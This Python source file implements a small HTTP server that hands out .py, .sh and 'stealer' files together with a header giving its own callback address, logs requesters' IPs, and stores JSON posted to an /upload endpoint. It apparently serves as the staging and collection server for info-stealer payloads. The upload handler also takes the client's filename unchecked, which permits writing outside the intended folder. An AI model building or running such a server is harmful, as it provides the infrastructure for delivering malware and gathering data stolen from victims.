"""
Server that hosts Python scripts and receives JSON data
"""

import http.server
import socketserver
import json
from pathlib import Path
import os
import socket


class ServerHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        """Handle JSON uploads"""
        if self.path == '/upload':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            
            filename = data.get('filename', 'data.json')
            json_content = data.get('json_data', {})
            
            output_path = Path("received") / filename
            output_path.parent.mkdir(exist_ok=True)
            
            with open(output_path, 'w') as f:
                json.dump(json_content, f, indent=2)
            
            print(f"Received: {filename}")
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            response = {"status": "success", "saved_as": str(output_path)}
            self.wfile.write(json.dumps(response).encode())
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_GET(self):
        """Serve Python scripts"""
        if self.path == '/':
            self.send_response(404)
            self.end_headers()
        elif self.path.endswith('.py') or self.path.endswith('.sh') or self.path.endswith('stealer'):
            script_name = self.path.lstrip('/')
            script_path = Path(script_name)
            
            if script_path.exists() and script_name != 'server.py':
                config = self._get_server_config()
                
                self.send_response(200)
                self.send_header('Content-type', 'application/octet-stream')
                self.send_header('X-Server-Config', json.dumps(config))
                self.end_headers()
                
                with open(script_path, 'rb') as f:
                    self.wfile.write(f.read())
                
                print(f"Served: {script_name}")
                print(f"From IP: {self.client_address[0]}")
            else:
                self.send_response(404)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()
    
    def _get_server_config(self):
        """Get server configuration"""
        server_ip = "localhost"
        
        try:
            import socket
            hostname = socket.gethostname()
            all_ips = socket.gethostbyname_ex(hostname)[2]
            
            for ip in all_ips:
                if not ip.startswith("127."):
                    if ip.startswith(("10.")):
                        server_ip = ip
                        break
                    server_ip = ip 
            if server_ip == "localhost":
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                try:
                    s.connect(("8.8.8.8", 80))
                    server_ip = s.getsockname()[0]
                finally:
                    s.close()
        except Exception as e:
            print(f"Error getting IP: {e}")
            server_ip = "localhost"

        print(f"Server config IP: {server_ip}")  # Debug line
        
        return {
            "server": {
                "ip": server_ip,
                "port": self.server.server_address[1],
                "url": f"http://{server_ip}:{self.server.server_address[1]}"
            }
        }

def start_server(port=8000, directory="./scripts"):
    """Start the server"""
    scripts_dir = Path(directory)
    scripts_dir.mkdir(exist_ok=True)
    os.chdir(directory)
    
    print(f"Server running on port {port}")
    
    with socketserver.TCPServer(("", port), ServerHandler) as httpd:
        httpd.serve_forever()


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Server")
    parser.add_argument("--port", "-p", type=int, default=8000, help="Port")
    parser.add_argument("--directory", "-d", default="./scripts", help="Directory")
    args = parser.parse_args()
    
    start_server(args.port, args.directory)